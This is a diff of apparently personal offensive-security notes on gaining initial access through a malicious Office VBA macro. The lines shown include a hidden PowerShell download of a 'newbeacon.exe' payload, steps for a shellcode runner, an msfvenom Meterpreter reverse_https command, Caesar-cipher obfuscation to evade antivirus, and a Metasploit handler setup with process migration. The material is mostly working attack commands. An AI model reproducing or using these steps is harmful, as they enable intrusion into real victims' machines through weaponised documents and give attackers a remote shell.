@@ -73,3 +73,24 @@ End Sub
     str = "powershell -c Start-bitstransfer -source http://192.168.49.141:80/newbeacon.exe -destination C:\\Windows\\Tasks\\newbeacon.exe"
     Shell str, vbHide
 ```
+#### Worksss!! Marco Initial access works
+1. Create [shell code runner](/msf/shellrunner.vba) VBA Marco using CreateThread-> execute the shell code, VirtualAlloc-> allocate memeory space for shell code, RtlMoveMemory->copy shell code into memory space
+
+the staged VBA shell code can be generated from msfvenom command 
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.141 LPORT=443 EXITFUNC=thread -f vbapplication
+```
+
+2. Copy VBA shell code into the [C# caesar cipher](/msf/caesar_cipher.cs) to encode the shell code, compile, run the program and copy output back to VBA marco 
+3. Set up the msf c2
+```
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lhost yourip
+set lport 443
+set enablestageencoding true
+set stageencoder x86/xor_dynamic
+set AutoRunScript migrate -n explorer.exe
+run -j
+```
